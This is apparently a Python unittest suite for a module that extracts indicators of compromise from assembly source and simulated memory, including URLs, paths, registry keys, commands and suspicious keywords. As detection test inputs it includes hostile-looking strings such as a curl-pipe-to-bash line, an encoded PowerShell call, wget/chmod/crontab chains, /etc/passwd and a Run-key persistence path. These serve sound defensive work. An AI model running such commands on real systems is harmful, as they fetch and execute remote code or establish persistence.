"""Tests for the indicators of compromise read from the source and from memory.

The cases cover every kind, the false positives the module avoids, the reading
of literals (escapes and commas), the comments, the grouping, the summary and
the memory scan with a fake reader.
"""

import dataclasses
import unittest
from typing import Any, Dict, List

from asmx.examples import EXAMPLES
from asmx.iocs import IOC_KINDS, Ioc, extract, from_memory, group, strings_of, summary, to_dicts


def kinds_of(text: Any, **kwargs: Any) -> List[str]:
    return [ioc.kind for ioc in extract(text, **kwargs)]


def values_of(kind: str, text: Any, **kwargs: Any) -> List[str]:
    return [ioc.value for ioc in extract(text, **kwargs) if ioc.kind == kind]


def memory_values(kind: str) -> List[str]:
    return [ioc.value for ioc in from_memory(FakeReader(MEMORY)) if ioc.kind == kind]


class FakeReader:
    """Fake memory reader, with the same contract as ``Machine``."""

    def __init__(self, data: bytes, base: int = 0x00400000) -> None:
        self.data = data
        self.base = base

    def rd8(self, addr: int) -> int:
        position = addr - self.base
        if 0 <= position < len(self.data):
            return self.data[position]
        return 0

    def read_mem(self, addr: int, size: int) -> int:
        value = 0
        for i in range(size):
            value |= self.rd8(addr + i) << (8 * i)
        return value

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        letters: List[str] = []
        for i in range(limit):
            byte = self.rd8(addr + i)
            if byte == 0:
                break
            letters.append(chr(byte))
        return "".join(letters)


class MemoryOnlyReader:
    """Reader that only offers ``read_mem`` and ``read_cstring``."""

    def __init__(self, data: bytes, base: int = 0x00400000) -> None:
        self.data = data
        self.base = base

    def read_mem(self, addr: int, size: int) -> int:
        value = 0
        for i in range(size):
            position = addr + i - self.base
            byte = self.data[position] if 0 <= position < len(self.data) else 0
            value |= byte << (8 * i)
        return value

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        letters: List[str] = []
        for i in range(limit):
            position = addr + i - self.base
            byte = self.data[position] if 0 <= position < len(self.data) else 0
            if byte == 0:
                break
            letters.append(chr(byte))
        return "".join(letters)


class CstringOnlyReader:
    """Reader that only knows how to read zero-terminated strings."""

    def __init__(self, data: bytes, base: int = 0x00400000) -> None:
        self.data = data
        self.base = base

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        letters: List[str] = []
        for i in range(limit):
            position = addr + i - self.base
            byte = self.data[position] if 0 <= position < len(self.data) else 0
            if byte == 0:
                break
            letters.append(chr(byte))
        return "".join(letters)


class NoCstringReader:
    """Reader that only has ``rd8`` - it cannot scan the memory."""

    def rd8(self, addr: int) -> int:
        return 65 if addr < 0x00400010 else 0


class BrokenReader:
    """Reader whose ``read_cstring`` always raises an exception."""

    def rd8(self, addr: int) -> int:
        return 0

    def read_cstring(self, addr: int, limit: int = 4096) -> str:
        raise RuntimeError("corrupted memory")


#: Memory used in the :func:`from_memory` tests.
MEMORY = (
    b"Hello, world!\x00"
    b"https://example.com/x\x00"
    b"\x01\x02password=hunter2\x00"
    b"1.2.3.4\x00"
    b"ab\x00"
    b"second text\x00"
)


class TestStringsOf(unittest.TestCase):
    """The reading of data literals and of comments."""

    def test_literal_with_double_quotes(self) -> None:
        self.assertEqual(strings_of('msg db "Hello, world!", 10'), [(1, "Hello, world!")])

    def test_literal_with_single_quotes(self) -> None:
        self.assertEqual(strings_of("msg dq 'five'"), [(1, "five")])

    def test_comma_concatenates_literals(self) -> None:
        self.assertEqual(strings_of('db "ab", "cd"', min_length=2), [(1, "abcd")])

    def test_number_between_literals_breaks_concatenation(self) -> None:
        source = 'msg db "Hello", 10, "world"'
        self.assertEqual(strings_of(source, min_length=2), [(1, "Hello"), (1, "world")])

    def test_newline_escape(self) -> None:
        self.assertEqual(strings_of('db "a\\nb"', min_length=3), [(1, "a\nb")])

    def test_tab_escape(self) -> None:
        self.assertEqual(strings_of('db "a\\tb"', min_length=3), [(1, "a\tb")])

    def test_backslash_escape(self) -> None:
        self.assertEqual(strings_of('db "C:\\\\Windows"', min_length=4), [(1, "C:\\Windows")])

    def test_quote_escape(self) -> None:
        self.assertEqual(strings_of('db "says \\"hi\\" now"'), [(1, 'says "hi" now')])

    def test_unknown_escape_stays_as_is(self) -> None:
        self.assertEqual(strings_of("db 'C:\\Windows'", min_length=4), [(1, "C:\\Windows")])

    def test_comment_included_by_default(self) -> None:
        self.assertEqual(strings_of("; nothing here"), [(1, "nothing here")])

    def test_comment_can_be_excluded(self) -> None:
        self.assertEqual(strings_of("; nothing here", include_comments=False), [])

    def test_comment_with_only_the_marker_is_ignored(self) -> None:
        self.assertEqual(strings_of(";"), [])

    def test_min_length_filters(self) -> None:
        self.assertEqual(strings_of('db "abcd"', min_length=5), [])
        self.assertEqual(strings_of('db "abcd"', min_length=4), [(1, "abcd")])

    def test_empty_string_is_ignored(self) -> None:
        self.assertEqual(strings_of('db ""', min_length=1), [])

    def test_string_with_only_separators_is_ignored(self) -> None:
        self.assertEqual(strings_of('db ",;:. -"', min_length=1), [])

    def test_multiple_lines_keep_the_line_of_each_string(self) -> None:
        source = 'section .data\nmsg db "first"\n; second string\n'
        self.assertEqual(strings_of(source), [(2, "first"), (3, "second string")])

    def test_empty_source(self) -> None:
        self.assertEqual(strings_of(""), [])
        self.assertEqual(strings_of("\n\n   \n"), [])

    def test_input_that_is_not_text(self) -> None:
        self.assertEqual(list(strings_of(None)), [])
        self.assertEqual(list(strings_of(b'db "abc"')), [])

    def test_binary_text_does_not_raise(self) -> None:
        source = '\x00\x01\x02\xff\xfe db "ok" \x07' + chr(0x10FFFF) * 3
        self.assertIsInstance(strings_of(source), list)


class TestUrl(unittest.TestCase):
    """The ``url`` kind."""

    def test_https_url(self) -> None:
        self.assertEqual(values_of("url", 'db "https://example.com/a"'), ["https://example.com/a"])

    def test_http_url_in_a_comment(self) -> None:
        self.assertEqual(values_of("url", "; download at http://x.org/y"), ["http://x.org/y"])

    def test_url_stops_at_comma_and_quote(self) -> None:
        self.assertEqual(values_of("url", 'db "http://x.org/a", 0'), ["http://x.org/a"])

    def test_url_without_final_dot(self) -> None:
        self.assertEqual(values_of("url", "; see https://example.com."), ["https://example.com"])

    def test_text_without_url(self) -> None:
        self.assertEqual(values_of("url", 'db "ftp://example.com"'), [])


class TestIpv4(unittest.TestCase):
    """The ``ipv4`` kind and the numbers that are not an address."""

    def test_valid_address(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "10.0.0.1", 0'), ["10.0.0.1"])

    def test_address_in_the_middle_of_the_sentence(self) -> None:
        self.assertEqual(values_of("ipv4", "; server 192.168.0.10 na rede"), ["192.168.0.10"])

    def test_five_octets_is_rejected(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "1.2.3.4.5"'), [])
        self.assertEqual(values_of("ipv4", 'db "1.2.3.4.5.6"'), [])

    def test_octet_above_255_is_rejected(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "300.1.2.3"'), [])
        self.assertEqual(values_of("ipv4", 'db "1.2.3.999"'), [])

    def test_version_number_is_not_an_address(self) -> None:
        self.assertEqual(values_of("ipv4", 'db "version 1.2"'), [])

    def test_ip_does_not_become_a_string(self) -> None:
        self.assertNotIn("string", kinds_of('db "10.0.0.1"'))


class TestDomain(unittest.TestCase):
    """The ``domain`` kind and the names that are not a domain."""

    def test_simple_domain(self) -> None:
        self.assertEqual(values_of("domain", 'db "example.com"'), ["example.com"])

    def test_domain_with_subdomains(self) -> None:
        self.assertEqual(values_of("domain", 'db "api.example.org.br"'), ["api.example.org.br"])

    def test_uppercase_domain(self) -> None:
        self.assertEqual(values_of("domain", 'db "Example.COM"'), ["Example.COM"])

    def test_file_name_is_not_a_domain(self) -> None:
        self.assertEqual(values_of("domain", 'db "file.asm"'), [])
        self.assertEqual(values_of("domain", "; nasm -f elf64 hello.asm"), [])
        self.assertEqual(values_of("domain", 'db "kernel32.lib"'), [])

    def test_section_name_is_not_a_domain(self) -> None:
        for section in (".text", ".data", ".rodata", ".bss", "section .text"):
            with self.subTest(section=section):
                self.assertEqual(values_of("domain", section), [])

    def test_markdown_file_is_not_a_domain(self) -> None:
        self.assertEqual(values_of("domain", "; see README.md and script.sh"), [])

    def test_domain_inside_url_is_not_repeated(self) -> None:
        self.assertEqual(values_of("domain", 'db "http://example.com/x"'), [])

    def test_domain_inside_email_is_not_repeated(self) -> None:
        self.assertEqual(values_of("domain", 'db "user@example.com"'), [])


class TestEmail(unittest.TestCase):
    """The ``email`` kind."""

    def test_valid_email(self) -> None:
        self.assertEqual(values_of("email", 'db "user@example.com"'), ["user@example.com"])

    def test_att_at_sign_is_not_an_email(self) -> None:
        self.assertEqual(values_of("email", "\t.type\tmain, @function"), [])

    def test_at_sign_without_domain_is_not_an_email(self) -> None:
        self.assertEqual(values_of("email", 'db "a@b"'), [])


class TestPaths(unittest.TestCase):
    """The ``path_unix`` and ``path_windows`` kinds."""

    def test_unix_path(self) -> None:
        self.assertEqual(values_of("path_unix", 'db "/etc/passwd", 0'), ["/etc/passwd"])

    def test_short_unix_path(self) -> None:
        self.assertEqual(values_of("path_unix", 'db "/tmp/x"'), ["/tmp/x"])

    def test_unix_path_of_an_executable(self) -> None:
        self.assertEqual(values_of("path_unix", 'db "/bin/sh"'), ["/bin/sh"])

    def test_division_is_not_a_path(self) -> None:
        self.assertEqual(values_of("path_unix", "mov rax, 100\ndiv rbx"), [])

    def test_windows_path_with_escaped_backslashes(self) -> None:
        source = 'db "C:\\\\Windows\\\\System32\\\\cmd.exe", 0'
        self.assertEqual(values_of("path_windows", source), ["C:\\Windows\\System32\\cmd.exe"])

    def test_windows_path_with_single_backslashes(self) -> None:
        source = "db 'C:\\Users\\user\\note.txt', 0"
        self.assertEqual(values_of("path_windows", source), ["C:\\Users\\user\\note.txt"])

    def test_windows_path_in_double_quotes_with_single_backslash(self) -> None:
        self.assertEqual(
            values_of("path_windows", 'db "C:\\Users\\user\\x"'), ["C:\\Users\\user\\x"]
        )

    def test_windows_path_with_a_space_in_the_middle(self) -> None:
        source = 'db "C:\\\\Program Files\\\\App\\\\x.dll"'
        self.assertEqual(values_of("path_windows", source), ["C:\\Program Files\\App\\x.dll"])

    def test_windows_path_stops_before_the_prose(self) -> None:
        self.assertEqual(
            values_of("path_windows", "; stays in C:\\Windows and done"), ["C:\\Windows"]
        )

    def test_unc_with_server_and_share(self) -> None:
        source = 'db "\\\\\\\\server\\\\share\\\\x", 0'
        self.assertEqual(values_of("path_windows", source), ["\\\\server\\share\\x"])

    def test_fallback_finds_path_in_comment_with_doubled_backslashes(self) -> None:
        source = "; downloads to C:\\\\Users\\\\user\\\\x.exe"
        self.assertEqual(values_of("path_windows", source), ["C:\\Users\\user\\x.exe"])

    def test_fallback_does_not_duplicate_the_literal_path(self) -> None:
        source = 'db "C:\\\\Windows\\\\System32", 0'
        self.assertEqual(len(values_of("path_windows", source)), 1)

    def test_path_piece_does_not_remain_in_the_report(self) -> None:
        values = values_of("path_windows", "db 'C:\\Users\\user\\note.txt', 0")
        self.assertNotIn("C:\\Users", values)

    def test_broken_path_becomes_string_when_nothing_matches(self) -> None:
        self.assertEqual(values_of("string", 'db "\\\\etc\\\\pass"'), ["\\etc\\pass"])


class TestRegistry(unittest.TestCase):
    """The ``registry`` kind."""

    def test_hklm(self) -> None:
        source = 'db "HKLM\\\\Software\\\\Microsoft", 0'
        self.assertEqual(values_of("registry", source), ["HKLM\\Software\\Microsoft"])

    def test_hkcu(self) -> None:
        source = 'db "HKCU\\\\Software\\\\App", 0'
        self.assertEqual(values_of("registry", source), ["HKCU\\Software\\App"])

    def test_current_version_run_key(self) -> None:
        source = 'db "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0'
        expected = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        self.assertEqual(values_of("registry", source), [expected])

    def test_current_version_run_alone(self) -> None:
        self.assertEqual(
            values_of("registry", 'db "CurrentVersion\\\\Run", 0'), ["CurrentVersion\\Run"]
        )

    def test_file_path_is_not_a_registry_key(self) -> None:
        self.assertEqual(values_of("registry", 'db "C:\\\\Windows\\\\System32"'), [])


class TestCommand(unittest.TestCase):
    """The ``command`` kind."""

    def test_cmd_and_powershell(self) -> None:
        source = 'db "cmd.exe /c powershell -enc AAA", 0'
        self.assertEqual(values_of("command", source), ["cmd.exe", "powershell"])

    def test_unix_commands(self) -> None:
        source = 'db "curl http://x.org/a | bash", 0'
        self.assertEqual(values_of("command", source), ["bash", "curl"])

    def test_sh_inside_the_path(self) -> None:
        self.assertIn("sh", values_of("command", 'db "/bin/sh"'))

    def test_file_name_with_sh_extension_is_not_a_command(self) -> None:
        self.assertEqual(values_of("command", "; see README.md and script.sh"), [])

    def test_full_executable_is_preferred(self) -> None:
        self.assertEqual(values_of("command", 'db "sh.exe -c id"'), ["sh.exe"])

    def test_push_mnemonic_is_not_the_sh_command(self) -> None:
        self.assertEqual(values_of("command", "push rbx\npop rbx"), [])

    def test_shl_mnemonic_is_not_the_sh_command(self) -> None:
        self.assertEqual(values_of("command", "shl rax, 1\nshr rbx, 2"), [])

    def test_inc_is_not_the_nc_command(self) -> None:
        self.assertEqual(values_of("command", "inc rax\ndec rbx"), [])

    def test_wget_chmod_and_crontab(self) -> None:
        source = 'db "wget -O x chmod +x x crontab -e", 0'
        self.assertEqual(values_of("command", source), ["chmod", "crontab", "wget"])


class TestExtension(unittest.TestCase):
    """The ``extension`` kind."""

    def test_sensitive_extensions(self) -> None:
        source = 'db "a.exe b.dll c.ps1 d.locked", 0'
        self.assertEqual(values_of("extension", source), [".dll", ".exe", ".locked", ".ps1"])

    def test_uppercase_extension_becomes_lowercase(self) -> None:
        self.assertEqual(values_of("extension", 'db "x.EXE"'), [".exe"])

    def test_innocent_extensions_stay_out(self) -> None:
        self.assertEqual(values_of("extension", 'db "a.asm b.txt c.c d.o"'), [])

    def test_shared_object_in_a_library(self) -> None:
        self.assertEqual(values_of("extension", 'db "libc.so.6"'), [".so"])


class TestKeyword(unittest.TestCase):
    """The ``keyword`` kind."""

    def test_english_words(self) -> None:
        source = 'db "password token secret wallet bitcoin", 0'
        expected = ["bitcoin", "password", "secret", "token", "wallet"]
        self.assertEqual(values_of("keyword", source), expected)

    def test_portuguese_keyword_pattern(self) -> None:
        self.assertEqual(values_of("keyword", 'db "senha", 0'), ["senha"])

    def test_value_stored_as_it_appeared(self) -> None:
        self.assertEqual(values_of("keyword", 'db "PASSWORD"'), ["PASSWORD"])

    def test_robot_is_not_the_bot_word(self) -> None:
        self.assertEqual(values_of("keyword", 'db "robot arm"'), [])

    def test_administrator_is_not_admin(self) -> None:
        self.assertEqual(values_of("keyword", 'db "administrator of the system"'), [])

    def test_digit_after_the_word_counts(self) -> None:
        self.assertEqual(values_of("keyword", 'db "password1"'), ["password"])

    def test_keylog_and_ransom(self) -> None:
        self.assertEqual(values_of("keyword", 'db "keylog ransom", 0'), ["keylog", "ransom"])


class TestExtract(unittest.TestCase):
    """The general behavior of :func:`extract`."""

    def test_empty_source(self) -> None:
        self.assertEqual(extract(""), [])
        self.assertEqual(extract("\n\n"), [])

    def test_input_that_is_not_text(self) -> None:
        self.assertEqual(extract(None), [])
        self.assertEqual(extract(42), [])
        self.assertEqual(extract(b'db "http://x.org"'), [])

    def test_binary_text_does_not_raise(self) -> None:
        source = "\x00\x01\x02\x03" * 50 + 'db "C:\\\\Windows\\\\x"\x7f\x1b'
        self.assertIsInstance(extract(source), list)

    def test_common_string_becomes_string(self) -> None:
        iocs = extract('msg db "Hello, world!", 10')
        self.assertEqual([(ioc.kind, ioc.value) for ioc in iocs], [("string", "Hello, world!")])

    def test_string_that_fell_into_a_kind_does_not_come_back_as_string(self) -> None:
        self.assertNotIn("string", kinds_of('db "http://example.com/x"'))

    def test_deduplication_keeps_the_first_line(self) -> None:
        source = 'a db "http://x.org/a"\nb db "http://x.org/a"\n'
        iocs = extract(source)
        self.assertEqual(len(iocs), 1)
        self.assertEqual(iocs[0].line, 1)

    def test_deduplication_by_kind_and_value(self) -> None:
        source = 'a db "cmd.exe"\nb db "cmd.exe"\n'
        values = [(ioc.kind, ioc.value, ioc.line) for ioc in extract(source)]
        self.assertEqual(values, [("command", "cmd.exe", 1), ("extension", ".exe", 1)])

    def test_comments_can_be_excluded(self) -> None:
        source = 'db "ok"\n; http://x.org/a\n'
        self.assertEqual(values_of("url", source), ["http://x.org/a"])
        self.assertEqual(values_of("url", source, include_comments=False), [])

    def test_min_length_applies_to_classification(self) -> None:
        self.assertEqual(values_of("keyword", 'db "root"', min_length=5), [])
        self.assertEqual(values_of("keyword", 'db "root"', min_length=4), ["root"])

    def test_line_is_the_source_line_number(self) -> None:
        source = 'section .data\n\nmsg db "http://x.org/a"\n'
        self.assertEqual(extract(source)[0].line, 3)

    def test_context_without_duplicate_spaces(self) -> None:
        source = 'msg    db    "http://x.org/a"        ; note'
        self.assertEqual(extract(source)[0].context, 'msg db "http://x.org/a" ; note')

    def test_order_by_line_and_kind(self) -> None:
        source = 'a db "/etc/passwd"\nb db "http://x.org/a"\n'
        self.assertEqual(
            [(ioc.line, ioc.kind) for ioc in extract(source)], [(1, "path_unix"), (2, "url")]
        )

    def test_all_kinds_come_from_ioc_kinds(self) -> None:
        source = (
            'db "http://x.org/a", 0\n'
            'db "10.0.0.1", 0\n'
            'db "example.com", 0\n'
            'db "a@example.com", 0\n'
            'db "/etc/passwd", 0\n'
            'db "C:\\\\Windows", 0\n'
            'db "HKLM\\\\Software", 0\n'
            'db "cmd.exe", 0\n'
            'db "x.enc", 0\n'
            'db "password", 0\n'
            'db "plain text", 0\n'
        )
        self.assertEqual(set(kinds_of(source)), set(IOC_KINDS))
        for ioc in extract(source):
            self.assertIn(ioc.kind, IOC_KINDS)
            self.assertEqual(ioc.to_dict()["label"], IOC_KINDS[ioc.kind])


class TestGroupAndToDicts(unittest.TestCase):
    """The grouping and the conversion to a dictionary."""

    def test_group_without_repeating_value(self) -> None:
        iocs = [
            Ioc("url", "http://x.org/a", 1),
            Ioc("url", "http://x.org/a", 2),
            Ioc("url", "http://x.org/b", 3),
        ]
        grouped = group(iocs)
        self.assertEqual(
            [ioc.value for ioc in grouped["url"]], ["http://x.org/a", "http://x.org/b"]
        )
        self.assertEqual(grouped["url"][0].line, 1)

    def test_group_in_ioc_kinds_order(self) -> None:
        iocs = [Ioc("string", "text", 1), Ioc("url", "http://x.org/a", 2)]
        self.assertEqual(list(group(iocs)), ["url", "string"])

    def test_group_of_empty_list(self) -> None:
        self.assertEqual(group([]), {})
        self.assertEqual(to_dicts([]), {})

    def test_to_dicts_brings_the_label(self) -> None:
        converted = to_dicts([Ioc("ipv4", "10.0.0.1", 4, "db 10.0.0.1")])
        self.assertEqual(
            converted["ipv4"][0],
            {
                "kind": "ipv4",
                "value": "10.0.0.1",
                "line": 4,
                "context": "db 10.0.0.1",
                "label": "IPv4 address",
            },
        )

    def test_ioc_to_dict(self) -> None:
        dictionary: Dict[str, Any] = Ioc("url", "http://x.org", 7).to_dict()
        self.assertEqual(sorted(dictionary), ["context", "kind", "label", "line", "value"])
        self.assertEqual(dictionary["label"], "URL")

    def test_ioc_is_immutable(self) -> None:
        ioc = Ioc("url", "http://x.org", 1)
        with self.assertRaises(dataclasses.FrozenInstanceError):
            ioc.value = "outro"  # type: ignore[misc]

    def test_all_kinds_have_a_label(self) -> None:
        for kind in IOC_KINDS:
            with self.subTest(kind=kind):
                self.assertTrue(IOC_KINDS[kind])
                self.assertEqual(Ioc(kind, "x", 1).to_dict()["label"], IOC_KINDS[kind])


class TestSummary(unittest.TestCase):
    """The one-line summary."""

    def test_summary_with_several_kinds(self) -> None:
        iocs = [
            Ioc("url", "http://x.org/a", 1),
            Ioc("url", "http://x.org/b", 2),
            Ioc("ipv4", "10.0.0.1", 3),
            Ioc("path_unix", "/etc/passwd", 4),
        ]
        self.assertEqual(summary(iocs), "4 indicator(s): 2 URL, 1 IPv4, 1 path")

    def test_summary_of_a_single_one(self) -> None:
        self.assertEqual(summary([Ioc("url", "http://x.org", 1)]), "1 indicator(s): 1 URL")

    def test_empty_summary(self) -> None:
        self.assertEqual(summary([]), "0 indicator(s)")

    def test_summary_from_extract(self) -> None:
        summary_text = summary(extract('db "cmd.exe"'))
        self.assertTrue(summary_text.startswith("2 indicator(s): 1 command"))
        self.assertIn("1 extension", summary_text)


class TestFromMemory(unittest.TestCase):
    """The string scan in the simulated memory."""

    def test_finds_simple_string(self) -> None:
        self.assertIn("Hello, world!", [ioc.value for ioc in from_memory(FakeReader(MEMORY))])

    def test_classifies_url(self) -> None:
        self.assertIn("https://example.com/x", memory_values("url"))

    def test_classifies_keyword(self) -> None:
        self.assertIn("password", memory_values("keyword"))

    def test_classifies_ip(self) -> None:
        self.assertIn("1.2.3.4", memory_values("ipv4"))

    def test_all_lines_are_zero(self) -> None:
        for ioc in from_memory(FakeReader(MEMORY)):
            self.assertEqual(ioc.line, 0)
            self.assertTrue(ioc.context)

    def test_min_length(self) -> None:
        self.assertEqual(from_memory(FakeReader(MEMORY), min_length=25), [])

    def test_does_not_repeat_value(self) -> None:
        data = b"http://x.org/a\x00http://x.org/a\x00"
        self.assertEqual(len(from_memory(FakeReader(data))), 1)

    def test_without_read_cstring_returns_empty(self) -> None:
        self.assertEqual(from_memory(NoCstringReader()), [])

    def test_broken_reader_does_not_raise(self) -> None:
        self.assertEqual(from_memory(BrokenReader()), [])

    def test_reader_with_only_read_mem(self) -> None:
        self.assertIn("Hello, world!", [ioc.value for ioc in from_memory(MemoryOnlyReader(MEMORY))])

    def test_reader_with_only_read_cstring(self) -> None:
        self.assertIn(
            "Hello, world!", [ioc.value for ioc in from_memory(CstringOnlyReader(MEMORY))]
        )

    def test_empty_memory(self) -> None:
        self.assertEqual(from_memory(FakeReader(b"\x00" * 64)), [])

    def test_binary_memory(self) -> None:
        self.assertEqual(from_memory(FakeReader(bytes(range(1, 20)) * 4)), [])

    def test_any_object_returns_empty(self) -> None:
        self.assertEqual(from_memory(object()), [])
        self.assertEqual(from_memory(None), [])

    def test_scan_window(self) -> None:
        data = b"first\x00second\x00"
        self.assertEqual([ioc.value for ioc in from_memory(FakeReader(data), size=9)], ["first"])

    def test_size_zero(self) -> None:
        self.assertEqual(from_memory(FakeReader(MEMORY), size=0), [])

    def test_different_base(self) -> None:
        reader = FakeReader(b"other text\x00", base=0x1000)
        self.assertEqual([ioc.value for ioc in from_memory(reader, base=0x1000)], ["other text"])


class TestExamples(unittest.TestCase):
    """The examples of the package go through the extractor."""

    def test_linux_hello_brings_hello_world(self) -> None:
        iocs = extract(EXAMPLES["linux-hello"]["code"])
        self.assertIn("Hello, world!", [ioc.value for ioc in iocs if ioc.kind == "string"])

    def test_windows_hello_brings_the_console_strings(self) -> None:
        iocs = extract(EXAMPLES["windows-hello"]["code"])
        values = [ioc.value for ioc in iocs if ioc.kind == "string"]
        self.assertIn("Hello from Windows!", values)
        # The example cites no Windows path at all: no ``C:\``.
        self.assertEqual([ioc.value for ioc in iocs if ioc.kind == "path_windows"], [])

    def test_broken_brings_the_message(self) -> None:
        values = [ioc.value for ioc in extract(EXAMPLES["broken"]["code"])]
        self.assertIn("Invalid action", values)
        self.assertIn("rafael", values)

    def test_gcc_att_has_no_indicator(self) -> None:
        self.assertEqual(extract(EXAMPLES["gcc-att"]["code"]), [])

    def test_all_examples_are_classifiable(self) -> None:
        for name, example in EXAMPLES.items():
            with self.subTest(example=name):
                iocs = extract(example["code"])
                converted = to_dicts(iocs)
                for ioc in iocs:
                    self.assertIn(ioc.kind, IOC_KINDS)
                    self.assertGreaterEqual(ioc.line, 1)
                for kind, items in converted.items():
                    self.assertIn(kind, IOC_KINDS)
                    self.assertTrue(items)
                self.assertTrue(summary(iocs))

    def test_strings_of_examples_keep_the_minimum_size(self) -> None:
        for name, example in EXAMPLES.items():
            with self.subTest(example=name):
                for line, text in strings_of(example["code"]):
                    self.assertGreaterEqual(line, 1)
                    self.assertGreaterEqual(len(text.strip()), 4)


if __name__ == "__main__":
    unittest.main()
